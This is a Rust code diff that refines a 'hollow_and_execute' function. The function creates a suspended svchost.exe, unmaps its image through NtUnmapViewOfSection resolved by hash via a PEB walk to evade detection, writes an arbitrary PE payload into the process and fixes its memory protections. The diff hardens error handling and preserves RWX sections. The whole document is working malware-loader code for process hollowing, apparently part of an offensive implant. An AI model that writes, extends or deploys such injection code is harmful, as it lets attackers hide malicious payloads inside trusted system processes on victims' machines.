@@ -1,4 +1,5 @@
 use anyhow::{anyhow, Result};
+#[cfg(windows)]
 use std::ffi::c_void;
 
 /// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
@@ -11,14 +12,12 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         STARTUPINFOA,
     };
     use winapi::um::winbase::CREATE_SUSPENDED;
-    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
+    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
     use winapi::um::winnt::{
         CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64,
-        IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
-        PAGE_READONLY, PROCESS_ALL_ACCESS,
+        IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
     };
     use winapi::um::handleapi::CloseHandle;
-    use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
     use winapi::shared::basetsd::SIZE_T;
 
     if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
@@ -43,7 +42,9 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
         let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
 
-        let host = b"C:\\Windows\\System32\\svchost.exe\0";
+        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
+        let host_path = format!("{}\\System32\\svchost.exe\0", sysroot);
+        let host = host_path.as_bytes();
         let mut si: STARTUPINFOA = zeroed();
         si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
         let mut pi: PROCESS_INFORMATION = zeroed();
@@ -64,9 +65,13 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         // NtUnmapViewOfSection to hollow the original image
         // Use PEB walk via pe_resolve instead of GetModuleHandleA/GetProcAddress (2.3)
         let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
-        if ntdll_base != 0 {
+        if ntdll_base == 0 {
+            tracing::warn!("hollow_and_execute: ntdll base not found via PEB; original image will not be unmapped");
+        } else {
             let unmap_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtUnmapViewOfSection\0")).unwrap_or(0);
-            if unmap_addr != 0 {
+            if unmap_addr == 0 {
+                tracing::warn!("hollow_and_execute: NtUnmapViewOfSection not resolved; skipping unmap");
+            } else {
                 type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
                 let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_addr);
 
@@ -84,7 +89,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                     std::mem::size_of::<usize>(),
                     null_mut(),
                 );
-                nt_unmap(pi.hProcess, remote_image_base as _);
+                let unmap_status = nt_unmap(pi.hProcess, remote_image_base as _);
+                if unmap_status < 0 {
+                    tracing::warn!("hollow_and_execute: NtUnmapViewOfSection returned 0x{:x}; continuing", unmap_status);
+                }
             }
         }
 
@@ -113,12 +121,17 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         let mut written: SIZE_T = 0;
 
         // Write PE headers
-        WriteProcessMemory(
+        if WriteProcessMemory(
             pi.hProcess, remote_base_ptr,
             payload.as_ptr() as _,
             (*nt).OptionalHeader.SizeOfHeaders as usize,
             &mut written,
-        );
+        ) == 0 {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return Err(anyhow!("WriteProcessMemory(headers) failed"));
+        }
 
         // Write sections
         let num_sections = (*nt).FileHeader.NumberOfSections as usize;
@@ -132,7 +145,12 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             let copy_sz = raw_sz.min(virt_sz);
             if raw_off + copy_sz > payload.len() || copy_sz == 0 { continue; }
             let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
-            WriteProcessMemory(pi.hProcess, dst, payload.as_ptr().add(raw_off) as _, copy_sz, &mut written);
+            if WriteProcessMemory(pi.hProcess, dst, payload.as_ptr().add(raw_off) as _, copy_sz, &mut written) == 0 {
+                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+                return Err(anyhow!("WriteProcessMemory(section {}) failed", i));
+            }
         }
 
         let delta = remote_base as isize - preferred_base as isize;
@@ -446,7 +464,7 @@ unsafe fn apply_section_protections(
     nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
 ) {
     use winapi::um::memoryapi::VirtualProtectEx;
-    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_READONLY};
+    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_READONLY};
 
     const SCN_EXEC:  u32 = 0x2000_0000;
     const SCN_WRITE: u32 = 0x8000_0000;
@@ -457,12 +475,11 @@ unsafe fn apply_section_protections(
     for i in 0..num_sections {
         let sec = &*first_section.add(i);
         let chars = sec.Characteristics;
-        let protect = if chars & SCN_EXEC != 0 {
-            PAGE_EXECUTE_READ
-        } else if chars & SCN_WRITE != 0 {
-            PAGE_READWRITE
-        } else {
-            PAGE_READONLY
+        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
+            (true, true)   => PAGE_EXECUTE_READWRITE, // RWX section preserved
+            (true, false)  => PAGE_EXECUTE_READ,
+            (false, true)  => PAGE_READWRITE,
+            (false, false) => PAGE_READONLY,
         };
         let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
         if virt_size == 0 { continue; }
